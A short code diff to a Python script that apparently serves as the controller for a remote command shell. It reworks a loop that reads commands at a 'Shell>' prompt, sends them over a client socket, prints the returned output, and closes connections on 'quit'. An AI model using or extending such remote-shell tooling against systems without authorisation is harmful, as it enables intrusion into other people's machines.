@@ -66,20 +66,21 @@ def send_commands(client_conn): # Send commands
         command = input(Fore.RED + " Shell> ")
     
 
-        if command == "exit":
-            
+        if command == "quit":
+            client_conn.close()
+            s.close()        
+            os.system('cls')
+            mainmenu()
             break
+        if len(str.encode(command)) > 0:
+            
+            client_conn.send(str.encode(command))
+            results = str(client_conn.recv(BUFFER_SIZE), "utf-8")
 
-        client_conn.send(command.encode())
-        results = client_conn.recv(BUFFER_SIZE).decode()
-                
-        print(results)
+            print(results, end="")
             
     
-    client_conn.close()
-    s.close()        
-    os.system('cls')
-    mainmenu()
+    
            
 
 def main():
